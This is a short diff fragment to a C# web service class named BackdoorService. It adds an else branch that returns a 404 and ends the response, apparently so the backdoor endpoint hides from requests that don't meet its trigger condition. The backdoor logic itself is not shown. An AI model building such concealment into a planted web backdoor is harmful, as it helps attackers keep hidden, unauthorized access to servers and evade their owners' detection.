@@ -44,6 +44,9 @@ public class BackdoorService : System.Web.Services.WebService {
             }
             
             context.ApplicationInstance.CompleteRequest();
+        } else {
+            response.StatusCode = 404;
+        	response.End();
         }
     }
 }
